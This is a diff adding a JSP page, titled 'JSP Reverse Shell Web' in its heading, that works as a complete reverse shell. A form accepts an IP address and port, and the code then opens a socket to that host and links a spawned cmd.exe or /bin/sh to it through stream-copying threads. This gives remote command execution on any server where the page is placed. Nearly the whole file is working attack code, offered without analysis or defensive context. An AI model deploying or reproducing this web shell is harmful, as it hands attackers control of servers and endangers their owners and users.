@@ -1,0 +1,70 @@
+<%@ page import="java.lang.*, java.util.*, java.io.*, java.net.*" %>
+
+<%! 
+// StreamConnector Class to handle I/O streams
+static class StreamConnector extends Thread {
+    private InputStream is;
+    private OutputStream os;
+
+    StreamConnector(InputStream is, OutputStream os) {
+        this.is = is;
+        this.os = os;
+    }
+
+    public void run() {
+        try (BufferedReader isr = new BufferedReader(new InputStreamReader(is));
+             BufferedWriter osw = new BufferedWriter(new OutputStreamWriter(os))) {
+             
+            char buffer[] = new char[8192];
+            int lenRead;
+            while ((lenRead = isr.read(buffer, 0, buffer.length)) > 0) {
+                osw.write(buffer, 0, lenRead);
+                osw.flush();
+            }
+        } catch (Exception ioe) {
+            ioe.printStackTrace();
+        }
+    }
+}
+%>
+
+<h1>JSP Reverse Shell Web</h1>
+<form method="post">
+    <label>IP Address:</label>
+    <input type="text" name="ipaddress" size=30>
+    <label>Port:</label>
+    <input type="text" name="port" size=10>
+    <input type="submit" name="Connect" value="Connect">
+</form>
+<hr>
+
+<%
+String ipAddress = request.getParameter("ipaddress");
+String ipPort = request.getParameter("port");
+
+if (ipAddress != null && ipPort != null) {
+    try {
+        int port = Integer.parseInt(ipPort);
+        Socket sock = new Socket(ipAddress, port);
+        
+        Runtime rt = Runtime.getRuntime();
+        Process proc;
+        
+        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            proc = rt.exec("cmd.exe");
+        } else {
+            proc = rt.exec("/bin/sh");
+        }
+
+        StreamConnector outputConnector = new StreamConnector(proc.getInputStream(), sock.getOutputStream());
+        StreamConnector inputConnector = new StreamConnector(sock.getInputStream(), proc.getOutputStream());
+        
+        outputConnector.start();
+        inputConnector.start();
+        
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+}
+%>
+
